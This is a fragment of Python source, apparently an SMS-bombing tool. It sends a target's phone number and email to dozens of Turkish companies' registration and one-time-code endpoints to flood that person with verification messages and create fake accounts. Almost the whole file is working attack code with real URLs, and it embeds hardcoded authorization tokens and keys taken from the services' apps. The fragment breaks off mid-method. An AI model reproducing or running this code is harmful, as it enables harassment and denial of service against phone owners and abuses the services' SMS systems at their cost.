            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "ionic://localhost", "Accept-Encoding": "gzip, deflate", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Accept-Language": "tr-TR,tr;q=0.9"}
            json={"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": self.phone, "type": 1}
            rentiva = requests.post(url, headers=headers, json=json)
            if rentiva.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rentiva.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rentiva.com")
            
    
    #bineq.tech
    def Bineq(self):
        try:
            url = f"https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
            bineq = requests.post(url, headers=headers)
            if bineq.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bineqapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bineqapi.heymobility.tech")
            
            
    #superpedestrian.com
    def Link(self):
        try:
            url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
            json={"phone_number": f"+90{self.phone}"}
            link = requests.post(url, json=json)
            if link.json()["detail"] == "Ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> consumer-auth.linkfleet.de")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> consumer-auth.linkfleet.de")

            
    #loncamarket.com
    def Lonca(self):
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json; charset=utf-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.loncamarket.com", "Dnt": "1", "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
            json={"Address": self.phone, "ConfirmationType": 0}
            lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False, timeout=3)
            if lonca.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> loncamarket.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> loncamarket.com")   
            
    
    #dgnonline.com
    def Dgn(self):
        try:
            url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": self.phone}
            dgn = requests.post(url, headers=headers, data=data)
            if dgn.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> odeme.dgnonline.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> odeme.dgnonline.com")  
            
    
    #yaanimail.com
    def Yaani(self):
        try:
            url = "https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
            json={"action": "create", "email": f"{''.join(choice(ascii_lowercase) for i in range(19))}@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": self.mail}, {"type": "msisdn", "value": f"90{self.phone}"}]}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yaanimail.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yaanimail.com")  
            
             
    #defacto.com.tr
    def Defacto(self):
        try:
            url = "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2FCustomer%2FSendPhoneConfirmationSms", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.defacto.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            data = {"mobilePhone": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["Data"]["IsSMSSend"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> defacto.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> defacto.com.tr")
    
    

            
    
    #icq.net
    def Icq(self):
        try:
            url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
            json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{self.phone}", "route": "sms"}, "reqId": "25299-1669396271"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"]["code"] == 20000:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")
            
    
    #boyner.com
    def Boyner(self):
        try:
            url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": self.phone, "day": "31", "Email": self.mail, "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> boyner.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> boyner.com")
            

    
    
    #buyursungelsin.com
    def Buyur(self):
        try:
            url = "https://app.buyursungelsin.com:443/api/customer/form/check"
            headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}
            data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{self.phone}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
            r = requests.post(url, headers=headers, data=data)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.buyursungelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.buyursungelsin.com")
            
    
    #idealdata.com.tr
    def Osmanlideal(self):
        try:
            r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{self.phone}")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> osmgck.idealdata.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> osmgck.idealdata.com.tr")
            
    
    #pinarsu.com.tr
    def Pinar(self):
        try:
            url = "https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp"
            headers = {"Content-Type": "application/json", "Devicetype": "ios", "Accept": "*/*", "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Level": "40202", "Accountid": "062511D3-BF52-4441-A29B-8250E3900931", "Accept-Encoding": "gzip, deflate", "User-Agent": "Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2", "Languageid": "D4FF115D-1AB5-4141-8719-A102C3CF9F1E", "Connection": "close"}
            json={"MobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.text == "true":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pinarsumobileservice.yasar.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pinarsumobileservice.yasar.com.tr")
            
    
    #suiste.com
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}
            data = {"action": "register", "gsm": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
            
            
    #hayatsu.com.tr
    def Hayat(self):
        try:
            url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"
            json={"mobilePhoneNumber": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["IsSuccessful"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hayatsu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hayatsu.com.tr")
            
            
    #pisir.com
    def Pisir(self):
        try:
            r = requests.post("https://api.pisir.com:443/v1/login/",  json={"app_build": "343", "app_platform": "ios", "msisdn": self.phone})
            if r.json()["ok"] == "1":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.pisir.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.pisir.com")
                
    
    #KimGbIster
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"})
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")


    #ikinciyeni.com
    def IkinciYeni(self):
        try:
            url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
            json={"accounttype": 1, "email": self.mail, "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["isSucceed"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> apigw.ikinciyeni.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> apigw.ikinciyeni.com")
            
            
    #terrapizza.com.tr
    def Terra(self):
        try:
            url = "https://api.terrapizza.com.tr:443/api/v1/customers"
            json={"email": self.mail, "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(self.phone), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
            r = requests.post(url,  json=json)
            if (r.status_code) == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.terrapizza.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.terrapizza.com.tr")
            
            

            
             
    #mogazmobilapinew.aygaz.com.tr
    def Mogaz(self):
        try:
            url = "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister"
            json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": self.mail, "isUserAgreement": True, "name": "Memati", "password": "", "phone": self.phone, "productType": 1, "subscription": True, "surname": "Bas"}
            r = requests.post(url, json=json)
            if (r.json()["messageCode"]) == "OK":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mogazmobilapinew.aygaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mogazmobilapinew.aygaz.com.tr")
            
            

            
    
    #petrolofisi.com.tr
    def PetrolOfisi(self):
        try:
            url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Channel": "IOS", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
            json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{self.phone}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilapi.petrolofisi.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilapi.petrolofisi.com.tr")
            
    
    #totalistasyonlari.com.tr
    def Total(self):
        try:
            r = requests.post(f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={self.phone}&api_key=GetDocuments%0A", verify=False)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.totalistasyonlari.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.totalistasyonlari.com.tr")
            
            
    #opet.com.tr
    def Opet(self):
        try:
            url = "https://api.opet.com.tr:443/api/authentication/register"
            json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": self.mail, "firstName": "Memati", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(self.phone), "opetKvkkAndEtk": True, "plate": "31ABC31"}
            r = requests.post(url, json=json)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.opet.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.opet.com.tr")


    #dolap.com
    def Dolap(self):
        try:
            url = "https://api-gateway.dolap.com:443/member"
            headers = {"Content-Type": "application/json", "Accept": "*/*", "Appversion": "359", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate", "Categorygroup": "WOMAN", "Access-Token": "", "User-Agent": "dolap/2 CFNetwork/1335.0.3 Darwin/21.6.0", "Appplatform": "ios"}
            json={"advertisingId": "", "campaignAgreement": False, "email": self.mail, "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": self.phone}
            r = requests.put(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api-gateway.dolap.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api-gateway.dolap.com")
            

    #heymobility.tech
    def Hey(self):
        try:
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
            r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}", headers=headers)
            if (r.json()["IsSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")
            

    #tazi.tech
    def Tazi(self):
        try:
            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
            json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["kod"]) == "0000":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")
            
    
    #isbike.istanbul
    def Isbike(self):
        try:
            url = "http://app.isbike.istanbul:80/api/uye/otpsms"
            headers = {"Content-Type": "application/json", "Connection": "close", "Accept": "application/json", "User-Agent": "isbike/1.3.5 (tr.gov.ibb.isbikeNew; build:74; iOS 15.6.1) Alamofire/5.5.0", "Authorization": "Basic aXNiaWtlX3VzcjppX3NiaWtlMTQ/LSo1MyE=", "Accept-Encoding": "gzip, deflate", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9"}
            json={"cep_tel": self.phone, "cep_tel_ulkekod": 90, "tip": "MBL_UYE_LOGIN"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["sonuc"]["aciklama"]) == "İşlem Başarılı":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.isbike.istanbul")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.isbike.istanbul")
            
    
    #n11.com
    def N11(self):
        try:
            url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
            headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
            json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": self.phone, "userType": "BUYER"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["isSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.n11.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.n11.com")
            
    
    #joker.com.tr
    def Joker(self):
        try:
            url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
            data = {"phone": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> joker.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> joker.com.tr")


    #e-bebek.com
    def Ebebek(self):
        try:
            r = requests.post("https://api2.e-bebek.com:443/authorizationserver/oauth/token?lang=tr&curr=EUR&client_secret=secret&grant_type=client_credentials&client_id=trusted_client")
            auth = (r.json()["access_token"])
            url = "https://api2.e-bebek.com:443/ebebekwebservices/v2/ebebek/users/anonymous/validate?curr=TRY&lang=tr"
            headers = {"Content-Type": "application/json", "Authorization": f"Bearer {auth}"}
            json={"email": self.mail, "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api2.e-bebek.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api2.e-bebek.com")


    #sakasu.com.tr
    def Saka(self):
        try:
            url = "https://mobilcrm2.saka.com.tr:443/api/customer/login"
            json={"gsm": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["status"]) == 1 :
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilcrm2.saka.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilcrm2.saka.com.tr")
            
    
    #gofody.com
    def Gofody(self):
        try:
            url = "https://backend.gofody.com:443/api/v1/enduser/register/"
            json={"country_code": "90", "phone": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> backend.gofody.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> backend.gofody.com")


    #madamecoco.com
    def Madame(self):
        try:
            url = "https://www.madamecoco.com:443/users/registration/"
            headers = {"Content-Type": "multipart/form-data; boundary=mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.madamecoco.com/", "User-Agent": "Madame%20Coco/1 CFNetwork/1335.0.3 Darwin/21.6.0"}
